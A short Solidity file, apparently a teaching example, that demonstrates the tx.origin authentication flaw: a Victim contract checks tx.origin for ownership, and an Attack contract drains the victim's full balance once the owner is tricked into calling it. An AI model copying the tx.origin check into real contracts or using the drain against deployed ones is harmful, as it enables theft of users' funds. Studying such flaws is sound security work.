//SPDX-License-Identifier:MIT

pragma solidity 0.8.19;

contract Victim{

    address public owner;

    constructor(){
        owner = msg.sender;
    }

    function deposit() public payable{}

    function withdraw(address _to,uint256 _amount) public payable{
        require(tx.origin==owner,"Only owner can call this function");
        (bool sent, ) = _to.call{value:_amount}("");
        require(sent,"Transaction failed");
    }
}

contract Attack{

    address public owner;
    Victim victim;
    constructor(Victim _victim){
        owner = msg.sender;
        victim = _victim;
    }

    function attack() public payable{
        victim.withdraw(owner,address(victim).balance);  //If attacker somewho tricks the owner of
                                                        //victim contract, then all the funds from victim's
                                                        //contract will be transferred to attackers account
    }
}